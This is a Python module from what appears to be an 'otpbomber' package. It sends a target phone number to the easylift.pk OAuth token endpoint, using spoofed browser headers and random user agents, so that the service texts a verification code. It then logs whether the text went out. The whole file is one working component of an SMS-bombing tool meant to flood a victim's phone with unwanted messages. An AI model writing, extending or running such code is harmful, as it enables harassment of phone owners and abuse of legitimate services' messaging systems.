from otpbomber.core import *
from otpbomber.localuseragent import *

async def eazylift(phone, client, out):
    name = "eazylift"
    domain = "eazylift"
    frequent_rate_limit=False


    headers = {
        
        'X-Requested-With': 'XMLHttpRequest',
        'User-Agent': random.choice(ua["browsers"]["chrome"]),        
        'Origin': 'https://app.easylift.pk',
        'Referer': 'https://app.easylift.pk/register',
    }

    data = {
        'username':  f"92{phone[-10:]}",
        'password': '',
        'grant_type': 'password',
        'hash': '',
        'device_token': '',
        'is_captain': str(random.randint(1, 10)),
    }


    response = await client.post('https://app.easylift.pk/api/oauth/token',  headers=headers, data=data)

    try:
        response_json = response.json()
        if 'verificationCode' in response_json:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": True, "error": False})
            return None
        else:
            out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit, "rateLimit": False,"sent": False, "error": False})
            return None
    except Exception:
        out.append({"name": name,"domain":domain,"frequent_rate_limit":frequent_rate_limit,  "rateLimit": False, "sent": False, "error": True})
        return None